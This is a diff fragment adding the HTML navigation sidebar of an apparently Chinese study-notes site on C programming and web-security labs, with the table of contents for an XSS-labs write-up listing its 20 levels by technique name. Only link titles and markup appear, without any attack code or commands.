+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    C语言
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            C语言
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3_1" id="__nav_2_3_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Alpha
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Alpha
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Alpha-%E6%95%B0%E7%BB%84/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 数组
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Alpha-%E5%87%BD%E6%95%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 函数
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Alpha-%E6%8C%87%E9%92%88/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 指针
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    数组必做题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    期末必做题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3_2" id="__nav_2_3_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    作业
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            作业
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E9%93%BE%E8%A1%A8%E4%BD%9C%E4%B8%9A/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    链表作业
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%BD%9C%E4%B8%9A/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文件操作作业
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3_3" id="__nav_2_3_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    知识点
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            知识点
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    位运算总结（转载）
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E5%B8%B8%E8%80%83%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    C 语言常考函数总结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文件读写常用函数总结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Scanf%20%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%81%87%E5%88%B0%E7%A9%BA%E6%A0%BC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    使用 scanf 时对空格处理？
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    网络安全
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            网络安全
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    靶场
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            靶场
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pikachu靶场打靶记录
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Upload labs靶场打靶记录
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Xss labs靶场打靶记录
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Xss labs靶场打靶记录
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#level-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-1 无过滤机制
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-2 闭合标签
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-3-htmlspecialchars" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-3 单引号闭合+htmlspecialchars()
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-4 双引号闭合+添加事件
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-5-javascript" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-5 JavaScript 伪协议
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-6" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-6 大小写绕过
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-7" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-7 双写绕过
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-8" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-8 编码绕过
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-9" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-9 检测关键字
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-10 隐藏信息
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-11-referer" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-11 referer
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-12-user-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-12 user-agent
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-13-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-13 cookie
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-14-exif" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-14 exif
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-15-ng-include" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-15 ng-include
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-16" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-16 空格实体转义
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-17" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-17 参数拼接
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-18" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-18 参数拼接
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-19-flash-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-19 flash xss
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-20-flash-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-20 flash xss
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      总结
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Sqli-labs%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sqli labs笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CTFHub%E6%8A%80%E8%83%BD%E6%A0%91%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFHub技能树笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XXE%E6%89%93%E9%9D%B6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XXE 打靶记录
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    CTFShow
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            CTFShow
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFshow-web/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow-WEB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 信息泄露
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E7%88%86%E7%A0%B4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 爆破
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-RCE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow RCE
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 文件包含
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFShow PHP特性
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 文件上传
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-Sql%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow Sql注入
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-XXE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow XXE
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    其他
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            其他
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/JavaScript%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JavaScript笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PHP反序列化
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/windterm%E8%BF%9E%E6%8E%A5kali/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windterm连接kali
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Group by报错注入
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/information_schema/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Information schema
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sql注入—udf 提权
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/mysql%E5%90%91%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99webshell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mysql向日志文件写webshell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E5%88%9D%E7%BA%A7%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PHP+MySQL博客（初级）
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PHP+MySQL博客（高级）
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/Python%E6%AD%A3%E5%88%99/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    python正则表达式
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    信息收集
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    转载
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            转载
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/%E6%96%87%E4%BB%B6%E5%A4%B4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文件头、尾总结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/HTTP%E6%8A%A5%E6%96%87/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP 报文
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/SSH-%E8%BF%9E%E6%8E%A5%E6%97%B6%E9%97%B4%E8%B6%85%E6%97%B6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSH:连接时间超时
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    git-stash 用法小结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/dirsearch%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    dirsearch 使用指南
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    常见的 php 伪协议
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/Feroxbuster/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Feroxbuster使用说明
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS 重绑定漏洞
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MySQL loaddata用法
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    常见的 php 伪协议
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/Apache%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Apache 换行解析漏洞
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_6" id="__nav_3_6_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    培训任务
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            培训任务
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../peixun/pwn%E5%9F%B9%E8%AE%AD/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pwn培训
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../peixun/reverse%E5%9F%B9%E8%AE%AD/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    reverse培训
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
